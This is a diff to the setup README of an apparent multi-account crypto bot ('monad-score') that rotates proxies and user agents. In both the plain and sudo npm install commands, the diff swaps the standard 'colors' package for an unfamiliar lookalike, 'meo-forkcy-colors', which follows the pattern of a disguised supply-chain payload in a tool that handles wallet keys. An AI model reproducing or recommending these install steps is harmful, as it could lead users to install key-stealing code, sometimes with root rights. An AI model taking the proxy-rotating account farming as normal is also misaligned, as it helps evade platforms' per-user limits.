@@ -49,7 +49,7 @@ You can clone the bot repository using Git. If you don't have Git installed, [in
 - After cloning, navigate into the bot's directory:
 
   ```bash
-  cd monad-score/monad-score
+  cd monad-score
   ```
 
 ### 2. **Install Dependencies:**
@@ -57,7 +57,7 @@ You can clone the bot repository using Git. If you don't have Git installed, [in
 - Once inside the bot directory, install the necessary dependencies by running the following command:
 
 ```bash
-npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent ethers 
+npm install --force user-agents axios meo-forkcy-colors https-proxy-agent socks-proxy-agent ethers 
 ```
 
 - If you're on **Windows** and encounter an Execution Policy error, run:
@@ -71,7 +71,7 @@ Then, run the npm install command again.
 - For **Linux/macOS**, if you face permission issues with the install command, prepend `sudo` to the command:
 
 ```bash
-sudo npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent ethers 
+sudo npm install --force user-agents axios meo-forkcy-colors https-proxy-agent socks-proxy-agent ethers 
 ```
 
 ### 3. **Prepare Configuration Files:**
@@ -88,7 +88,6 @@ This file controls the bot’s behavior. Below is an example configuration:
 
 ```json
 {
-  "timeZone": "en-US",
   "skipInvalidProxy": true,
   "delayEachAccount": [5, 8],
   "timeToRestartAllAccounts": 300,
@@ -99,7 +98,6 @@ This file controls the bot’s behavior. Below is an example configuration:
 ```
 
 - **Fields Explained:**
-  - `timeZone`: Time zone setting (e.g., "en-US").
   - `skipInvalidProxy`: Skip invalid proxies if `true`.
   - `delayEachAccount`: Random delay range (in seconds) between accounts.
   - `timeToRestartAllAccounts`: Time (in seconds) to restart all accounts.
